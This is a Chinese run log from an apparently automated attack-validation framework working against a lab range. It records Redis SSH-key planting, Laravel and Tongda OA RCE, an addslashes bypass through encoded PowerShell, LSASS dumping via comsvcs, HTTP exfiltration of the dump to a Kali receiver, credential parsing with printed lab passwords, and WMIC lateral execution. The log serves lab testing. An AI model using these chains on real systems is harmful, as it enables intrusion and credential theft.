# 实机验证记录（run log）

一次验证 = 一个 run 目录。**证据只认产物**：`output/runs/<run_id>/<call_id>/` 里的
`call.json` / `stdout.txt` / `stderr.txt`（run 目录不进 git，仓库里只留这张索引表）。
状态口径：入口脚本存在只是必要条件，**实机跑通并留下调用记录**之后，卡片 `status` 才从
`planned` 改成 `implemented`。控制点固定为本机里的 Kali（VMnet8，192.168.52.128），
适配器在本机跑、argv 通过 SSH 在 Kali 上执行（见契约第 10 节「远程执行器」）。判定由程序做（契约第 12 节）：
同一个调用目录里除了 `call.json` / `stdout.txt` / `stderr.txt`，还会落 `envelope.json`（适配器解析出的证据与 marker）
与 `judgement.json`（三闸判定：`pass` / `unsatisfied` / `uncertain`，`value` = true / false / null）。
表里的「状态」列从 D25 起同时记判定结论——**执行过（executed）不等于已验证**。

| run | 日期 | 图节点（case） | 技能 | 目标 | 判定调用 call_id | 状态 | 证据摘要 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `D22-node14` | 2026-09-15 | 14 `direct_network_access` | `pre.nmap_tcp_probe` | 192.168.52.10:6379 | `call-20260915T235403-ac6f7d` | executed | nmap grepable：`6379/open/tcp//redis` → `state=open` |
| `D22-node14b` | 2026-09-15 | 14（重复跑） | `pre.nmap_tcp_probe` | 192.168.52.10:6379 | `call-20260915T235505-458aad` | executed | 重复性确认：同样的 `state=open` |
| `D22-node12` | 2026-09-15 | 12 `public_application_initial`（T1190 redis） | `exploit.redis_unauth_write` | 192.168.52.10:6379 | `call-20260915T235456-bf6313`（GET） | executed | `write_accepted=true`、`readback_value=1f6b0c-ok`；三步调用 SET→GET→DEL（`cleanup_deleted=true`，跑完复原靶场） |
| `D22-node30` | 2026-09-15 | 30 `direct_network_access` | `pre.nmap_tcp_probe` | 192.168.52.10:81 | `call-20260916T000004-e88579` | executed | 发布入口可达性：`81/open/tcp//http` → `state=open` |
| `D22-node28` | 2026-09-15 | 28 `public_application_initial`（T1190 laravel） | `exploit.laravel_ignition_rce` | http://192.168.52.10:81（web1 发布 → 容器 80） | `call-20260915T235839-198810` | executed | 五步链（clear→payload→AA→convert→phar）后经 HTTP 取回输出：`uid=33(www-data) …` + 容器 `8e172820ac78`；marker `agv198810` 命中；跑完自动清理 proof 文件并截断日志 |
| `D23-session-web1` | 2026-09-16 | 运行现场（`--need session`，服务节点 7 的 source） | `session.ssh_via_redis` | 192.168.52.10（redis 6379 → ssh 22） | `call-20260916T000800-60567e`（SSH 登录） | executed | ①keygen ②读公钥 ③指纹 ④`CONFIG SET dir /root/.ssh` ⑤`CONFIG SET dbfilename authorized_keys` ⑥`SET …`⑦`SAVE` ⑧`ssh -i` 登录：`session_identity=uid=0(root)`、`session_host=ubuntu`、`ssh_key_fingerprint=SHA256:wpMvf5uR…ibpI8`；本次 `restore=false`（会话留给节点 7 用） |
| `D23-node7` | 2026-09-16 | 7 `command_interpreter`（T1623 OA） | `exploit.tongda_oa_include_rce` | http://192.168.52.30:8080（pc1） | `call-20260916T001058-34fdaa-include` | executed | **经执行器链 `kali -> web1` 从图里的 source 打**：三调用 payload/upload/include；`command_output="nt authority\\system\nPC1"`（与节点 `target_privilege=system` 一致）；include 路径由上传响应推导（`/general/../../attach/im/2609/949701765.agv_oa.shell.png`，source=response） |
| `D24-webshell-pc1` | 2026-09-16 | 运行现场（pc1 通道，`driver=webshell`） | `post.channel_echo` | pc1 的 OA webshell（192.168.52.30:8080） | `call-20260916T002330-8f7a99` | executed | webshell 驱动首跑（单跳从 Kali）：`session_identity=nt authority\\system`、`session_host=PC1`，0.39s；`client` 走缺省 `/tmp/agv-payloads/agv_oa_http.py` |
| `D24-webshell-pc1b` | 2026-09-16 | 同上（vantage 语义复跑） | `post.channel_echo` | 同上 | `call-20260916T002342-96698a` | executed | 经执行器链从 web1 发请求，同判据；`call.json` 记 `vantage=kali@192.168.52.128 -> root@192.168.52.10` |
| `D24-node41-dump` | 2026-09-16 | 41 `lsass_system` | `cred.comsvcs_minidump` | pc1 本机（经 OA 通道） | `call-20260916T004524-d9d8b7` | executed | `HOST=PC1 / PID=500 / PATH=C:\Windows\Temp\agv_lsass.dmp / SIZE=36271042 / MAGIC=MDMP`；vantage 同链；卡片首跑（前一次 `call-20260916T004513-ebccce` 是花括号 bug，已修） |
| `D24-node41-exfil` | 2026-09-16 | 41（外带环节） | `transfer.http_post_file` | pc1 → Kali:9090（经 OA 通道） | `call-20260916T004647-2de5e9` | executed | 源端 `LOCAL 36271042 86bac178…85f95`、接收端 `RECV OK 36271042 86bac178…85f95`，`transfer_verified=true`（首跑 `call-20260916T004624-9bc5a3` 因回显折行漏判，已修） |
| `D24-node41-parse2` | 2026-09-16 | 41（解析环节） | `cred.pypykatz_parse` | Kali（本机解析端） | `call-20260916T004756-79f805`（绑定）/ `call-20260916T004756-b18e6e`（解析） | executed | `dump_sha256=86bac178…85f95`；`WHOAMIANONY\bunny` NT=`cc567d55…`、明文 `Bunny2021`；`PC1$` 机器账户 NT=`3e6a3d8c…`；`material_kept=true`（首跑 `call-20260916T004658-dea471` 哈希被打码，触发 `keep_material` 改动） |
| `D24-e-fw` | 2026-09-16 | 2 `disable_firewall`（vantage = pc1） | `evasion.wmi_firewall_off` | dc 192.168.93.30（经 pc1 通道） | `call-20260916T010838-bd164c` | executed | `firewall_state=disabled`（三档 `EnableFirewall=0x0`）；诚实性：本机 before/after 都是 0x0，只判**状态**不判**变化** |
| `D24-e-wmi` | 2026-09-16 | 38/48（远程执行） | `exec.wmic_remote_cmd` | dc 192.168.93.30（经 pc1 通道） | `call-20260916T011031-651470` | executed | `hostname=DC`、`identity_name=whoamianony\administrator`、`identity_sid=S-1-5-21-…-500`，`exit_code=0` |
| `D24-e-wmi-pc2` | 2026-09-16 | 48（pc1→pc2） | 同上 | pc2 192.168.93.40（经 pc1 通道） | `call-20260916T011045-37207a` | executed | `hostname=PC2`、同域管身份、同 SID ⇒ 节点 48 的「远程执行 + 身份」前提实测成立 |
| `D25-checker` | 2026-09-16 | 14 `direct_network_access` | `pre.nmap_tcp_probe` | 192.168.52.10:6379 | `call-20260916T021135-dd6fa5` | executed · **pass** | 判定器首跑（`run_skill_remote.py --check`）：信封与判定一起落盘；三闸全过——freshness（证据锚在本次调用）/ target（观测 `192.168.52.10` 对齐节点 web1）/ effect（nmap `6379/open/tcp//redis` ⇒ `state==open`），`value=true` |
| `D25-checker-neg` | 2026-09-16 | —（显式 requirement 的负例） | `pre.nmap_tcp_probe` | 192.168.52.10:3389 | `call-20260916T021213-44af65` | executed · **unsatisfied** | 负例（给判定器一条真拒绝）：nmap `3389/closed/tcp` ⇒ `state==open` 不成立，`value=false`；CLI 退出码 1 |
| `D24-c2-channel` | 2026-09-16 | 运行现场（web2 容器通道，`driver=webshell` + `mode=plain`） | `post.channel_echo` | 容器 web2（http://192.168.52.10:81 → `/agv.shell.php`） | `call-20260916T013453-2ac7c0` | executed | plain 模式首跑：`session_identity=www-data`、`session_host=8e172820ac78`；客户端是通用的 `runtime/clients/agv_http_cmd.py`（部署到 Kali `/opt/agv/tools/`） |
| `D24-c2-suid` | 2026-09-16 | 26 `path_hijack_root`（容器内提权） | `priv.suid_path_hijack` | 容器 web2（经 plain 通道） | `call-20260916T013604-14bf6c-run` | executed | `suid_binary=/home/jobs/shell`（源码 `system("ps")` 走相对路径）、`uid_after=0`（`uid=0(root) gid=0(root) groups=0(root),33(www-data)`）；它是逃逸链路的顺序前置 |
| `D26-loop-node14` | 2026-09-16 | 14 `direct_network_access`（节点循环首跑） | `pre.nmap_tcp_probe` | 192.168.52.10:6379 | `call-20260916T022743-4c7d71` | executed · **pass** · 节点 **succeeded** | `run_node.py` 首跑（决策轨迹：run → done）：选卡 → 执行 → 判定 → 收尾；`node_result.json` + `attempt-1-pre.nmap_tcp_probe/`（inputs + envelope + judgement）落盘；`check_call.py` 复判同判 |
| `D26-loop-node26-blocked` | 2026-09-16 | 26（节点循环 · 供给缺口例） | `priv.suid_path_hijack`（未执行） | 容器 web2（未执行） | —（`attempts=[]`） | **blocked**（`need`） | 无 `session_ref` ⇒ 循环停在 `need`，一条命令都没发（`calls=[]`）；退出码 3；不连 VM 也能诊断 |
| `D27-path` | 2026-09-16 | 整图 14 节点（运行循环首跑） | 见 D27 节 | 见 D27 节 | `node-14/call-…95fb15`、`node-12/call-…6ebd9c`、`node-7/call-…f07418-include`、`node-30/call-…7e24c4` | executed · 4 succeeded / 1 failed / 9 blocked | 14/12/30 **pass**；7 因判定器缺陷首判 `unsatisfied`（见 D27 节，已修）；2 `graph_gap`；19/28/26/22/41/38/48 `need`；37/47 `or_unmet`；整图 3.2 秒（blocked 零成本） |
| `D27-path2` | 2026-09-16 | 整图 14 节点（修复后复跑） | 同上 | 同上 | `node-7/call-20260916T024954-78cb76-include` | executed · 5 succeeded（含 1 skip）/ 9 blocked | 7 **pass**；**19 被 `skip_node`**（effect 6 已证，零成本推进）；节点 7 调用 `check_call.py` 复判 **pass** |
| `D29-full` | 2026-09-16 | 整图 14 节点（D29 首跑：链 + 供给自动） | 见 D29 节 | 见 D29 节 | `node-7/call-20260916T033904-7d64a6-include`、`node-14/call-20260916T033904-97aa0e`、`node-30/call-20260916T033905-2e282a` | executed · 5 succeeded（含 1 skip）/ 1 uncertain / 8 blocked | 28 `uncertain`（effect：容器返回 502——Web2 没开）；41 `need`：通道探针的 target 闸对不上（观测 `session_host=PC1` vs 节点 `192.168.52.30`），判定器自己点名要 `--host-map` |
| `D29-full2` | 2026-09-16 | 补 host-map + 开 Web2 后复跑 | 同上 | 同上 | `node-28/…`（`unsatisfied`）、`node-41/…`（`chain_unfolded`） | executed · 5 succeeded / 1 failed / 1 uncertain / 7 blocked | 28 **failed**：laravel 卡 effect 规则与证据形状不符（见 D29 节缺陷 D）；41 `chain_unfolded`：dump 段 pass 但链取不到 `dump_path`（缺陷 C） |
| `D29-full3` | 2026-09-16 | 修证据管道后复跑 | 同上 | 同上 | `node-28/call-…`、`node-41/…`（parse 段判 `uncertain`） | executed · 6 succeeded / 1 uncertain / 7 blocked | 28 **pass**（规则统一生效）；41 链跑到 parse 段停：解析产物**没有来源主机**（缺陷 E） |
| `D29-path` | 2026-09-16 | 整图 14 节点（**头条 run：链整条自动跑通**，76 秒） | 见 D29 节 | 见 D29 节 | `node-41/attempt-1-…5f3d49`（dump）/ `attempt-2-…90b84a`（exfil）/ `attempt-3-…1685f1`（parse）；通道复验 `supply-41-…73d95b` | executed · **7 succeeded / 7 blocked** | 41 **succeeded · `chain_done`**（三段全 pass）；节点 7 留下的通道被自动登记 + 复验后才用；38/48 `need` 点名账号（`dc/pc2:domain_administrator`） |

## 怎么复现一次 run

```powershell
# 1) 图节点 → 锁定技能 + 绑定输入（控制点决定多 IP 主机用哪个地址）
python scripts/select_skill.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --node 14 `
    --assets data/inputs/hongri7/assets.json --from 192.168.52.128 `
    --inputs-out output/runs/D22-node14/inputs.json --selection-out output/runs/D22-node14/selection.json

# 2) 实机执行（适配器本地、argv 在 Kali）
python scripts/run_skill_remote.py --skill pre.nmap_tcp_probe --input output/runs/D22-node14/inputs.json `
    --run-dir output/runs/D22-node14 --remote kali@192.168.52.128 --password kali
```

`--assets data/inputs/hongri7/assets.json` 是部署事实表：多归属主机（web1 同时有
192.168.1.103 / 192.168.52.10）按控制点所在网段选地址；容器没有自己的地址时，用端点的
发布地址（`web2_docker` 的 laravel 81 → `web1:81`）。选择结果里的 `notes` 会写明每一次
推导，`--selection-out` 把溯源一起留档。

## 多跳执行位置（执行器链）——D23 起

图里说「谁动手」：`web1 -> pc1:8080` 就**必须从 web1 打**。`--chain` 把执行点表达成数据：

```powershell
# 1) 先拿源主机的会话（运行现场需求，不是图节点）
python scripts/select_skill.py --need session --node 7 --graph output/hongri7/json/Hongri7_v2.action_graph.json `
    --assets data/inputs/hongri7/assets.json --from 192.168.52.128 --inputs-out output/runs/D23-session-web1/inputs.json
python scripts/run_skill_remote.py --skill session.ssh_via_redis `
    --input output/runs/D23-session-web1/inputs.json --run-dir output/runs/D23-session-web1 `
    --remote kali@192.168.52.128 --password kali

# 2) 用链把节点命令送到那台源主机上执行
$env:AGV_SSH_PASSWORD = "kali"
python scripts/run_skill_remote.py --skill exploit.tongda_oa_include_rce `
    --input output/runs/D23-node7/inputs.json --run-dir output/runs/D23-node7 `
    --chain data/inputs/hongri7/chains/kali_to_web1.json
```

```json
{"hops": [{"kind": "ssh", "target": "kali@192.168.52.128", "password_env": "AGV_SSH_PASSWORD"},
          {"kind": "ssh", "target": "root@192.168.52.10", "key": "/home/kali/.ssh/agv_session"}]}
```

每次调用的 `call.json` 里都有 `vantage`（`kali@192.168.52.128 -> root@192.168.52.10`），
证据因此能回答「从哪打的」。内层跳必须给 `key`：外层 `BatchMode=yes` 下口令交互会挂，链在
加载时就报错。

**跑完的清理**（本次会话是 `restore=false`，故意留给节点 7 用）：

```powershell
# Kali 上：删掉落地文件与私钥
ssh kali@192.168.52.128 "ssh -i /home/kali/.ssh/agv_session root@192.168.52.10   'rm -f /root/.ssh/authorized_keys /tmp/agv-payloads/*' ; rm -f /home/kali/.ssh/agv_session*"
# redis 复原（web1 上确认）：CONFIG SET dir / ; CONFIG SET dbfilename dump.rdb ; DEL agv_session_key
```

## webshell 会话驱动（D24-a）：复用 pc1 上已有的通道

节点 7 打出来的 OA webshell 是 pc1 上的 SYSTEM 执行能力，但此前只是一批「通道参数」。D24-a 把它接成
`session_ref` 的第三个驱动（`webshell`），「必须从 pc1 动手」的节点（2 / 41 / 38 / 48）因此有了执行位置；
`post.channel_echo`（契约第 9 节第 12 条）是它的第一个消费者——探针固定，判定只看目标回显。

```powershell
# 单跳：请求从控制点（Kali）发出，命令仍在 pc1 上执行
python scripts/run_skill_remote.py --skill post.channel_echo `
    --input output/runs/D24-webshell-pc1/inputs.json --run-dir output/runs/D24-webshell-pc1 `
    --remote kali@192.168.52.128 --password kali --timeout 60

# 链：请求从图里的 source（web1）发出（vantage 落进 call.json）
$env:AGV_SSH_PASSWORD = "kali"
python scripts/run_skill_remote.py --skill post.channel_echo `
    --input output/runs/D24-webshell-pc1b/inputs.json --run-dir output/runs/D24-webshell-pc1b `
    --chain data/inputs/hongri7/chains/kali_to_web1.json --timeout 60
```

- 单跳 `call-20260916T002330-8f7a99`：`session_identity=nt authority\system`、`session_host=PC1`；
  `client` 走缺省值（D24 前用 `push_file.py` 往 Kali 推了一份客户端）。
- 链 `call-20260916T002342-96698a`：同判据，`vantage=kali@192.168.52.128 -> root@192.168.52.10`。
- 契约：webshell 只跑**单命令**（没有控制台可以喂行）；`base_url` / `include_path` 是通道状态，缺任一项解析阶段就停。

## 靶场侧的一次性准备（不进 run 目录）

| 工具 | 部署位置 | 命令 |
| --- | --- | --- |
| phpggc（造 phar） | Kali `/opt/agv/tools/phpggc/phpggc` | 解包仓库外下载的 `phpggc.zip` 到该目录 |
| 外带接收端 | Kali `/opt/agv/tools/agv_http_recv.py` | `python scripts/push_file.py --local skills/transfer.http_post_file/client/agv_http_recv.py --dest /opt/agv/tools/agv_http_recv.py --remote kali@192.168.52.128 --password kali --sudo`（起法见 D24-c 节） |
| 固定 PoC | Kali `/opt/agv/tools/CVE-2021-3129/CVE-2021-3129.py` | `python scripts/push_file.py --local skills/exploit.laravel_ignition_rce/poc/CVE-2021-3129.py --dest /opt/agv/tools/CVE-2021-3129/CVE-2021-3129.py --remote kali@192.168.52.128 --password kali --mkdir --mode 0755 --sudo` |

## 前置侦察（D23 顺带做的，用 OA 卡当通道从 pc1 实测）

判定「节点 2 的前提是否成立」用的不是新技能，而是**已经验证过的 OA 卡**：把 `command` 换成探测命令，
从 pc1（SYSTEM）上跑。结果不是节点级证据，只作校验与追溯用（图的 source/precondition 是否与实况一致）。

| run | 探测 | 判定调用 call_id | 结果 |
| --- | --- | --- | --- |
| `D23-probe-pc1b` | `dir \\192.168.93.30\c$`（SMB/445） | `call-20260916T001459-419025-include` | ~~`SMB445=FAIL`（和图上「域防火墙拦住横向」一致）~~ **已被 D24 推翻**：这是**通道假象** —— OA 通道会 `addslashes`，UNC 路径被改坏，根本没走到网络层（见下节） |
| `D23-probe-pc1c` | `ping 192.168.93.30`（ICMP） | `call-20260916T001512-8b4e69-include` | `ICMP=OK`（dc 活着、IP 层可达 → 不是「主机不通」，是**端口被过滤**） |

两个踩坑（写进 D24 计划）：

1. **pc1 是 PowerShell 2.0**：`Test-NetConnection`、`TcpClient.Connect` 这类新写法在它上面不可靠（实测报
   FileStream/异步相关错误）。远端探测要用 `cmd` 内建命令（`dir` / `sc` / `ping` + `&&`/`||`）并输出**纯 ASCII** 结论。
2. **OA 页面的 charset 会毁掉中文输出**：探测命令回显中文时会变成乱码（PHP 侧做过编码转换），
   所以探测命令只输出 `KEY=OK/FAIL` 这类 ASCII 标记。

## D24 侦察：OA 通道会 `addslashes`，D23 的「445 被拦」是误判

D24-b 用同一张 OA 卡复测 `pc1 -> dc / pc2:445`，先撞上**通道改写命令**：

| run | 探测 | 判定调用 call_id | 结果 |
| --- | --- | --- | --- |
| `D24-probe-dollar` | `echo ipc$` + `dir \\dc\c$` | `call-20260916T002642-e346aa-include` | `$` 保留；`dir` 仍失败 —— 排除「`$` 被吞」 |
| `D24-probe-445b` | `net use \\dc\ipc$` / `\\pc2\ipc$` / `\\127.0.0.1\ipc$` | `call-20260916T002613-1a56b0-include` | 三个都 **67**（找不到网络名）—— 连本机都一样，**可疑** |
| `D24-probe-netuse2` | 回显 `\\dc\ipc$` + `sc` / `net view` | `call-20260916T002859-98a96d-include` | 回显变成 `[\\\\192.168.93.30\\ipc$]`（反斜杠**加倍**）；`sc` → 1707 |
| `D24-probe-esc` | `echo [\a\b]` / `echo [a'b]` | `call-20260916T003150-046d99-include` | 回显 `[\\a\\b]` / `[a\'b]` —— 通道对 `\` 和 `'` 做了 **`addslashes`** |

真相：`addslashes` 把 `\\192.168.93.30\ipc$` 改成 `\\\\192.168.93.30\\ipc$` → SMB 客户端**解析阶段**就失败（67/1707），
根本没到网络层。D23 的 `SMB445=FAIL` 不是防御在拦，是**命令被改坏**。

绕开方式（实测）= `powershell -nop -EncodedCommand <base64(UTF-16LE)> < nul`：

- base64 不含 `\` `'` `"`，`addslashes` 无从下手；
- **`< nul` 不可省**：popen 交给 PowerShell 的 stdin 是坏管道，不加会抛 `ArgumentException`（报错文本含 FileStream）、
  且 `-EncodedCommand` **完全不执行**（`D24-probe-enc` 复现）——这同样是 D23「TcpClient 不可靠」的真因；
- 加上之后输出干净、只剩结果（`D24-probe-nul`）。

复测结果：

| run | 探测 | 判定调用 call_id | 结果 |
| --- | --- | --- | --- |
| `D24-probe-nul` | TcpClient 连 dc:445 / pc2:445 / 本机 445 | `call-20260916T002837-b94718-include` | `DC445=OPEN`、`PC2445=OPEN`、`LOCAL445=OPEN` —— **端口全通** |
| `D24-probe-smb` | `net use \\dc\ipc$ /user:假凭据` + `dir \\dc\c$` | `call-20260916T002920-29da97-include` | **1219**（凭据冲突）/ **86**（密码不正确）→ SMB 已到**认证层** |

结论：**pc1 → dc / pc1 → pc2 的 445 本来就是通的**；节点 38/48 没有端口障碍。
节点 2 的图前提里并不含凭据（合取项只有 `hacl` / `networkServiceInfo` / `ttpExists` / `execCode(pc1,system)`，全成立），
但**远程 SCM 这条方法本身要认证到 dc**——1219/86 说明卡住的是认证材料，不是可达性；这层差异记进缺口表（D24-c 节有对照）。
残留的 `net use` 条目已用 `net use * /delete /y` 清掉。

## D24-c：节点 41 的方法链（dump → 外带 → 解析）——方法成立，leaf 不成立

节点 41（`lsass_system`）此前的唯一方法是 msf kiwi 控制台脚本，而 pc1 上没有 meterpreter（那边是 webshell 驱动，只跑单命令）。
D24-c 把它拆成一条**三段方法链**，三段各自留下调用记录（契约第 9 节第 13-15 条）：

| 段 | run | 判定调用 call_id | 证据 |
| --- | --- | --- | --- |
| ① dump（在 pc1 上） | `D24-node41-dump` | `call-20260916T004524-d9d8b7` | `HOST=PC1` / `PID=500` / `SIZE=36271042` / `MAGIC=MDMP` |
| ② 外带（pc1 → Kali） | `D24-node41-exfil` | `call-20260916T004647-2de5e9` | 源端 `LOCAL 36271042 86bac178…211a1`；接收端 `RECV OK 36271042 86bac178…211a1`；`transfer_verified=true` |
| ③ 解析（在 Kali 上） | `D24-node41-parse2` | `call-20260916T004756-79f805`（绑定）+ `call-20260916T004756-b18e6e`（解析） | `dump_sha256=86bac178…85f95`；`WHOAMIANONY\bunny` NT=`cc567d55…`、明文 `Bunny2021`；`PC1$` 机器账户 NT=`3e6a3d8c…` |

### 三段各自撞到的坑（已写进卡片与契约）

1. **32 位通道打 64 位 lsass = 0 字节**：`D24-probe-lsass` / `call-20260916T003437-1236db-include` 打出来 `SIZE=0`、magic 全零。
   pc1 是 x64 Win7，但 webshell 上下文（php-cgi → cmd → 32 位 PowerShell）是 32 位；正确姿势是
   `& "$env:SystemRoot\sysnative\rundll32.exe" "$env:SystemRoot\System32\comsvcs.dll,MiniDump" <pid> <dump> full`
   ——可执行文件走 WOW64 的 `sysnative` 别名拿到真 64 位 rundll32，DLL 给 `System32` 字符串（不受 WOW64 重定向影响，由 64 位进程自己解析）。
2. **单条通道命令必须 < 8191 字符**：`D24-probe-lsass64` / `call-20260916T003514-db425b-include` 的 outer base64 有 8200 字符，
   整条命令被 cmd 直接吞掉（`returncode=0`、stdout 空，**静默失败**）——卡片因此在 7500 字符处主动报错，不赌。
3. **回显会折行**：64 位 sha256 被拆成两行（`…d92ca85f9` + `5`），解析前必须先压掉空白再匹配
   （首跑 `D24-node41-exfil` / `call-20260916T004624-9bc5a3` 就是因此漏判）。
4. **`WebClient.UploadFile` 发的是 multipart**：接收端首跑多收到 199 字节（头部 + 尾边界）——接收端因此实现 multipart 与 raw 两条读取路径；
   自测覆盖「正文里含伪造 boundary 字节」与「不足一块的尾部」（`read1()` 不能换成 `read()`，否则永挂）。
5. **凭据本身也会被脱敏**：`D24-node41-parse` / `call-20260916T004658-dea471` 的输出里是 `NT: <redacted>`——`redact.py` 把 32 位十六进制当秘密。
   凭据解析卡的证据**就是**材料，所以 runner 加了具名例外 `keep_material`（契约第 10 节「脱敏的唯一例外」），`call.json` 记 `material_kept: true`，argv 照旧脱敏。

### 诚实性发现：事实 42 这个 leaf 在当前靶场状态不成立

**D39 更新（2026-09-16）**：这条 leaf 的成立与否取决于**目标状态**—— dump 前让域管在 pc1 上有一次交互式登录（Type 2）后跑同一条链，解析段就读回 `username Administrator`（`output/runs/D39-live1/node-5/attempt-3-credential.parse.minidump_pypykatz/call-20260916T082601-663b1e/`）；方法卡没改一个字，见文末「真机单点复验 · D39」节。

图上节点 41 是 `RULE 6 (OS Credential Dumping LSASS Memory)`，它的合取项是
`execCode(pc1,system)` ✓、`hasAccount(pc1,domain_administrator,lab_domain_credential,system)`（**LEAF，事实 42**）、
`networkServiceInfo(pc1,lsass,local,none,system)` ✓、`ttpExists(pc1,lsass,…,domainCredentialDumping,…)` ✓；
目标是 `getAccount(pc1,domain_administrator,…)`（事实 40）。

解析出来的 6 个 LogonSession 里**只有**域用户 `bunny` 与机器账户 `PC1$`，**没有域管**。追加侦察
`D24-probe-domainadmins` / `call-20260916T004321-9b0169-include`（pc1 以 SYSTEM 身份跑 `net group "Domain Admins" /domain`）
也被拒（机器身份查不了域 SAMR），从另一侧确认没有可用的域管会话。

对照 `hongri7_writeup_validation_audit.md` 的取证记录：writeup 验证期在 lsass 里看到的「域管会话」，
其中包含**我方自己 `net use` 建立的登录条目**——靶场本身并没有域管交互登录。结论：

- 节点 41 的**方法**（T1003.001 dump → 外带 → 解析）成立，三段都有本次 run 的真证据；
- 事实 42 `hasAccount(pc1, domain_administrator, …)` 是**环境前置 leaf**：先有域管登录，才可能从 lsass 里读到，**方法创造不出它**；
- 因此事实 40（`getAccount(pc1,domain_administrator,…)`）在本轮**没被产生**，节点 38/48 的凭据前提也不成立 —— 如实记成缺口，
  而不是拿 `bunny` 的凭据冒充域管凭据。

这正是「验证器要能追溯」的价值：leaf 不成立时能指出是**哪一环**没成立（是环境前置没成立，不是利用方法失败），
而不是笼统地说「攻击失败」。

### 顺带查实

- 通道里 cmd 的中文输出是 **GBK**：脚本须 `[Console]::OutputEncoding=UTF8` 并按 936 解码原生输出，否则双重重码。
- 接收端一次性运行：

```bash
# Kali 侧（--once：收完一个请求就退出）
(setsid nohup python3 /opt/agv/tools/agv_http_recv.py --port 9090 --out /home/kali/agv-loot --once > /tmp/agv_recv.log 2>&1 &)
```

- 接收端日志 `/tmp/agv_recv.log` 记 `saved … (<bytes> bytes)`；Kali 侧独立复核 `sha256sum /home/kali/agv-loot/lsass-pc1-card.dmp` 与双边账一致。

### D24-c 的清理（D24-d 收尾时执行）

```bash
# Kali：落地产物 + 接收端日志
ssh kali@192.168.52.128 "rm -f /home/kali/agv-loot/* /tmp/agv_recv.log"
```

pc1 上还留着两个 34MB 的 dump（`C:\Windows\Temp\agv_lsass.dmp` 与侦察期的 `agv_lsass*.dmp`），
用 OA 卡跑一条 `cmd /c del /f /q` 即可清掉（经通道的固定姿势见 D24-b：`EncodedCommand` + `< nul`）；
web1 / redis 的复原命令见上文「多跳执行位置」与「跑完的清理」。

## D24-e：节点 2/38/48 的方法卡（Windows vantage）——域管凭据实测可用，两条通道被证伪

背景：D24-b 查出 pc1→dc / pc1→pc2 的 445 本来就通，D24-c 又证明 pc1 的 lsass 里没有域管会话。
那节点 2/38/48 到底缺什么？只能实测：把「谁动手」按图放回 pc1（Windows 侧），用 pc1 上现成的命令通道做。

### 侦察（借 OA 卡从 pc1 发命令，全部是 `EncodedCommand < nul` 包装）

| run | 目的 | 结果 |
| --- | --- | --- |
| `D24-e-probe-dcadmin` | `net use \\…\ipc$ /user:WHOAMIANONY\Administrator Whoami2021` | `RC=0`；`dir \\dc\c$`、`dir \\pc2\c$` 都能列目录 ⇒ **域管凭据可用**（节点 2/38/48 的凭据前提成立） |
| `D24-e-probe-scm` | dc 侧注册表 / 服务 / 写文件通道 | 三档 `EnableFirewall=0x0`（dc 防火墙**本来就是关的**）；`sc \\dc query`、`reg query`、C$ 写读回删都 `RC=0` |
| `D24-e-probe-scsvc` / `-scsvc2` / `-scsvc3` | 用服务方式在 dc 上起载荷 | `sc create` 成功、`sc start` 只回 **1053**、目标**没有产出**；`schtasks /create + /run` 也「成功」但同样**没有产出** ⇒ 这台 dc 上服务与计划任务都起不了载荷 |
| `D24-e-probe-wmic` | `wmic … process call create "cmd.exe /c echo … > agv_g.out"` | `ReturnValue=0`、`ProcessId=256`，目标 `agv_g.out` 回读成功 ⇒ WMI 可用 |
| `D24-e-diag1` / `-diag2` | 复刻两卡的批处理落盘与回读时序 | 定位两个真原因（见下）；`diag2` 的 t=3/6/9/12s 四段 `dir` 是「批处理内容坏了」的铁证 |
| `D24-e-diag3` | 问 pc1 的 PowerShell 版本与数组语义 | `PSVER=2.0`；`@(( 'x' + 'y' ), 'z')` 括号包裹正常（2 元素），未包裹的拼接行为异常 |
| `D24-e-diag4` | 列三台机器的 `agv_*` 残留 | dc：`agv_d.out`、`agv_diag2.bat`；pc2：无；pc1：一堆 `agv_*.txt` + 3 个 dump（D24-d 清理清单已更新） |

### 两张卡的首跑都撞了同一个语言层陷阱，外加一个通道层陷阱

1. **PowerShell 数组字面量里逗号比 `+` 紧**：`@('echo x > ' + $path, …)` 的元素被拆成「每个操作数一个元素」，
   送到 dc 的 `.bat` 变成 14 行碎片，`cmd` 什么都不做（首跑 `call-20260916T010334-669f18` 的 `.out` 是 NOFILE）。
   PS 2.0（pc1）与 5.1（本机）行为一致，两边都复现过。修法：固定脚本只留**整行字符串**，
   路径/名字用 `@@OUT@@` 这类占位符在适配器里绑定；`tests/test_skill_adapters.py` 加了静态断言守住这条。
2. **回显在 ~78 列折行，而且折在 token 内部**：注册表路径以 `...Fi` + 换行 + `rewallPolicy\DomainProfile` 回来
   （`D24-e-fw` / `call-20260916T010730-207194`），行导向解析全部失配，首跑因此只写 `observations`。
   修法：新增 `runtime.adapter.squash()`（把换行整段去掉），解析在单行副本上做；
   卡 B 的 `probe_block` 还要带上尾部 `done` 标记，否则 `_between` 找不到右边界。

### 跑通（主表最后三行）

- `D24-e-fw`：`firewall_state=disabled`（三个 profile 都是 `0x0`）。**诚实性**：dc 本来就没开防火墙，
  before / after 一样是 `0x0`，所以这条证据只证明**调用之后的状态**，不能声称「是我们关的」；
  批处理把 before / after 两块都留在原始输出里，就是让这个差别可审。
- `D24-e-wmi`（dc）/ `D24-e-wmi-pc2`（pc2）：`hostname` + `identity_name=whoamianony\administrator` +
  `identity_sid=…-500`（域管 RID 500），`exit_code=0` ⇒ 节点 38/48 的「远程执行 + 身份」前提实测成立。
- 节点 2/38/48 的 `execCode(pc1,system)` 一侧由 D24-a/D24-b 已证（pc1 的 webshell 通道就是 SYSTEM）；
  这轮补的是「按图那条边，真的能把命令送到目标并拿回目标的身份」。

### D24-e 的清理（并进 D24-d，实测残留）

- dc：`C:\Windows\Temp\agv_d.out`、`agv_diag2.bat`（卡内自清只删自己那个 marker 的文件）
- pc1：`C:\Windows\Temp\agv_*.txt`（约 40 个探查文本）+ 3 个 dump（`agv_lsass.dmp` 34MB、`agv_lsass64.dmp`、`agv_lsass_probe.dmp`）
- pc2：无残留（`dir` 返回「找不到文件」）；`net use` 会话由卡片收尾删除
## D24-c2：容器会话（webshell `plain` 模式）——SUID 提权跑通，逃逸链路成立但卡保持 planned

节点 22/26 的前置是「web2_docker 上有会话」。D22 起容器侧只有一个「一次性 RCE」（laravel 卡），没有可复用通道。
